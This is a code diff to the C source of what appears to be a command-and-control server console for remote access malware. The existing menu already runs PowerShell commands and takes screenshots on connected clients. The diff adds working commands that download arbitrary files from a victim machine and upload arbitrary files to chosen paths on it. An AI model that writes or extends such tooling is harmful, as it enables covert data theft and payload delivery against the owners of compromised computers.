@@ -6,9 +6,30 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
+#include <limits.h>
 #include "c2.h"
 #include "common.h"
 #include "server/server_psh.h"
+
+#define DEFAULT_DOWNLOAD_NAME "downloaded_file.bin"
+#define DEFAULT_UPLOAD_NAME   "uploaded_file.bin"
+
+static void trim_newline(char *str) {
+    if (!str) return;
+    size_t len = strlen(str);
+    while (len > 0 && (str[len - 1] == '\n' || str[len - 1] == '\r')) {
+        str[--len] = '\0';
+    }
+}
+
+static int prompt_line(const char *prompt, char *out, size_t out_len) {
+    printf("%s", prompt);
+    if (!fgets(out, out_len, stdin)) {
+        return 0;
+    }
+    trim_newline(out);
+    return 1;
+}
 
 int main() {
     // Client and server socket file descriptors
@@ -52,10 +73,12 @@ int main() {
 
     // Main loop
     while(1) {
-        char buf[C2_BUF_SIZE], cmd[5];
+        char cmd[5];
         printf("[*] Command list, type quit to exit:\n");
         printf("1. Execute powershell command.\n");
         printf("2. Take screenshot.\n");
+        printf("3. Download file from client.\n");
+        printf("4. Upload file to client.\n");
         if (!fgets(cmd, sizeof(cmd), stdin)) break;
         cmd[strcspn(cmd, "\n")] = '\0'; // remove newline if present
 
@@ -92,6 +115,115 @@ int main() {
             free(file_buffer);
 
             printf("[+] Screenshot saved to %s (%u bytes)\n", filename, file_size);
+            continue;
+        } else if (strcmp(cmd, "3") == 0) {
+            char remote_path[512] = {0};
+            char local_path[512] = {0};
+
+            if (!prompt_line("Remote file path to download: ", remote_path, sizeof(remote_path))) break;
+            if (remote_path[0] == '\0') {
+                printf("[ERR] Remote path cannot be empty.\n");
+                continue;
+            }
+
+            if (!prompt_line("Local save path: ", local_path, sizeof(local_path))) break;
+
+            if (safe_send(client_fd, "3", 1, 0) <= 0) break;
+            if (safe_send_payload(client_fd, remote_path, strlen(remote_path) + 1, 0) < 0) break;
+
+            char status;
+            if (safe_recv(client_fd, &status, 1, 0) <= 0) break;
+
+
+            if (status == '1') {
+                int file_size = 0;
+                BYTE *file_buffer = (BYTE*)safe_recv_payload(client_fd, &file_size, 0);
+                if (!file_buffer) {
+                    printf("[ERR] Failed to receive file contents.\n");
+                    continue;
+                }
+
+                FILE *fp = fopen(local_path, "wb");
+                if (!fp) {
+                    perror("fopen");
+                    free(file_buffer);
+                    continue;
+                }
+
+                size_t expected = (size_t)file_size;
+                size_t written = expected ? fwrite(file_buffer, 1, expected, fp) : 0;
+                fclose(fp);
+                free(file_buffer);
+
+                if (written != expected) {
+                    printf("[ERR] Short write when saving %s\n", local_path);
+                } else {
+                    printf("[+] Saved file to %s (%d bytes)\n", local_path, file_size);
+                }
+            } else {
+                char *err_msg = (char*)safe_recv_payload(client_fd, NULL, 0);
+                if (err_msg) {
+                    printf("[ERR] Client error: %s\n", err_msg);
+                    free(err_msg);
+                } else {
+                    printf("[ERR] Client reported failure.\n");
+                }
+            }
+            continue;
+        } else if (strcmp(cmd, "4") == 0) {
+            char local_path[512] = {0};
+            char remote_path[512] = {0};
+
+            if (!prompt_line("Local file path to upload: ", local_path, sizeof(local_path))) break;
+            if (local_path[0] == '\0') {
+                printf("[ERR] Local path cannot be empty.\n");
+                continue;
+            }
+
+            if (!prompt_line("Destination path on client: ", remote_path, sizeof(remote_path))) break;
+
+            size_t file_size = 0;
+            char *file_buffer = read_file(local_path, &file_size);
+            if (!file_buffer) {
+                continue;
+            }
+
+            if (file_size > INT_MAX) {
+                printf("[ERR] File too large to transfer (>%d bytes)\n", INT_MAX);
+                free(file_buffer);
+                continue;
+            }
+
+            if (safe_send(client_fd, "4", 1, 0) <= 0) {
+                free(file_buffer);
+                break;
+            }
+            if (safe_send_payload(client_fd, remote_path, strlen(remote_path) + 1, 0) < 0) {
+                free(file_buffer);
+                break;
+            }
+            if (safe_send_payload(client_fd, file_buffer, (int)file_size, 0) < 0) {
+                free(file_buffer);
+                break;
+            }
+            free(file_buffer);
+
+            char status;
+            if (safe_recv(client_fd, &status, 1, 0) <= 0) {
+                break;
+            }
+
+            if (status == '1') {
+                printf("[+] Uploaded %zu bytes to %s\n", file_size, remote_path);
+            } else {
+                char *err_msg = (char*)safe_recv_payload(client_fd, NULL, 0);
+                if (err_msg) {
+                    printf("[ERR] Client error: %s\n", err_msg);
+                    free(err_msg);
+                } else {
+                    printf("[ERR] Client reported failure while uploading.\n");
+                }
+            }
             continue;
         } else {
             printf("[ERR] Invalid command.\n");
